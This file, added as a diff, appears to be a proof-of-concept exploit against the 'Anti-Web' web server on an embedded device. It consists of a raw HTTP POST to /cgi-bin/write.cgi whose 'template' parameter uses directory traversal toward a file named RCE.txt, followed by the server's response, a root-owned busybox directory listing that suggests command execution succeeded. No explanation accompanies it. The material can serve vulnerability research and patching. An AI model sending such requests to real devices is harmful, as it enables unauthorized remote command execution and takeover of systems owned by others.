@@ -1,0 +1,84 @@
+POST /cgi-bin/write.cgi HTTP/1.1
+Host: 78.67.29.120
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-AR,en-US;q=0.7,en;q=0.3
+Referer: http://217.179.198.16/
+Cookie: ID=0bce4b7eb065092efd274212b25c50e1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+page=/&template=../../../../../../../home/httpd/RCE.txt
+
+
+
+
+#####################################################################
+
+
+HTTP/1.1 200 OK
+Server: Anti-Web V3.8.2
+Content-type: text/html
+Content-length: 4145
+
+drwxr-xr-x    2 root     root            0 Apr 24  2009 .
+drwxr-xr-x   13 root     root            0 May 28 06:42 ..
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 addgroup -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 adduser -> busybox
+-rwxr-xr-x    1 root     root       304308 Apr 24  2009 busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 cat -> busybox
+-rwxr-xr-x    1 root     root        49812 Apr 24  2009 chat
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 chgrp -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 chmod -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 chown -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 cp -> busybox
+-rwxr-xr-x    1 root     root        45672 Apr 24  2009 cron
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 date -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 dd -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 delgroup -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 deluser -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 df -> busybox
+-rwxr-xr-x    1 root     root        82264 Apr 24  2009 dhcpcd
+-rwxr-xr-x    1 root     root        11576 Apr 24  2009 discard
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 echo -> busybox
+-rwxr-xr-x    1 root     root        26000 Apr 24  2009 erase
+-rwxr-xr-x    1 root     root        24592 Apr 24  2009 expand
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 false -> busybox
+-rwxr-xr-x    1 root     root        95724 Apr 24  2009 ftpd
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 grep -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 gunzip -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 gzip -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 hostname -> busybox
+-rwxr-xr-x    1 root     root        34624 Apr 24  2009 inetd
+-rwxr-xr-x    1 root     root        29336 Apr 24  2009 init
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 kill -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 ln -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 login -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 ls -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 mkdir -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 mknod -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 mount -> busybox
+-rwxr-xr-x    1 root     root        86480 Apr 24  2009 msntp
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 mv -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 pidof -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 ping -> busybox
+-rwxr-xr-x    1 root     root       163640 Apr 24  2009 pppd
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 ps -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 pwd -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 rm -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 rmdir -> busybox
+-rwxr-xr-x    1 root     root        34364 Apr 24  2009 rtc
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 sed -> busybox
+-rwxr-xr-x    1 root     root        40152 Apr 24  2009 sh
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 sleep -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 tar -> busybox
+-rwxr-xr-x    1 root     root        46216 Apr 24  2009 telnetd
+-rwxr-xr-x    1 root     root        37604 Apr 24  2009 tip
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 touch -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 true -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 umount -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 uname -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 usleep -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 vi -> busybox
+lrwxrwxrwx    1 root     root            7 Apr 24  2009 zcat -> busybox
